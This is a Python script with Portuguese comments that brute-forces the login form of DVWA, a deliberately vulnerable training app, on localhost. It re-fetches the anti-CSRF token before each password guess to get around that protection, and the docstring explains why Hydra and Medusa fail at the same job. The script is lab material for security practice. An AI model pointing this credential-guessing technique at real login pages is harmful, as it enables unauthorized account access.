#!/usr/bin/env python3
"""
dvwa_bruteforce_csrf.py

Forca bruta contra o formulario de login do DVWA, lidando com o token
anti-CSRF dinamico (campo escondido `user_token`, que muda a cada
carregamento da pagina).

Por que nao usar Medusa/Hydra direto?
--------------------------------------
O formulario de login do DVWA (a partir da v1.9) inclui um token CSRF
obrigatorio. Sem reenviar um token valido a cada tentativa, o servidor
rejeita a requisicao com "CSRF token is incorrect" -- uma mensagem
diferente da que configuramos como sinal de falha ("Login failed").
Isso faz tanto o Medusa quanto o Hydra (nas configuracoes padrao do
modulo web-form/http-post-form) falharem silenciosamente: o Medusa
retorna erro de protocolo (302 nao tratado) e o Hydra reporta TODAS as
senhas como validas (falso positivo), porque a string de falha nunca
aparece na resposta.

Este script resolve isso fazendo, para cada tentativa:
  1. GET na pagina de login para capturar um token CSRF novo + cookie
     de sessao;
  2. POST com usuario, senha e o token capturado;
  3. Verifica se a string de falha ("Login failed") esta ausente da
     resposta -- se estiver ausente, a credencial e valida.

Uso:
    python3 dvwa_bruteforce_csrf.py
"""
import re
import sys
import requests

TARGET = "http://127.0.0.1/login.php"
USERNAME = "admin"
WORDLIST = "../wordlists/senhas.txt"
FAIL_STRING = "Login failed"

session = requests.Session()
# garante que o cookie "security=low" esteja sempre presente
session.cookies.set("security", "low")

with open(WORDLIST) as f:
    passwords = [linha.strip() for linha in f if linha.strip()]

print(f"[*] Testando {len(passwords)} senhas para o usuario '{USERNAME}'\n")

for senha in passwords:
    # 1) pega a pagina de login para extrair um token CSRF novo
    r = session.get(TARGET)
    match = re.search(r"user_token'\s+value='([a-f0-9]+)'", r.text)
    if not match:
        print("[!] Nao encontrei o user_token na pagina. Abortando.")
        sys.exit(1)
    token = match.group(1)

    # 2) envia a tentativa de login com o token capturado
    data = {
        "username": USERNAME,
        "password": senha,
        "Login": "Login",
        "user_token": token,
    }
    r2 = session.post(TARGET, data=data)

    if FAIL_STRING not in r2.text:
        print(f"[+] CREDENCIAL ENCONTRADA: {USERNAME}:{senha}")
        sys.exit(0)
    else:
        print(f"[-] Falhou: {senha}")

print("\n[!] Nenhuma senha da wordlist funcionou.")
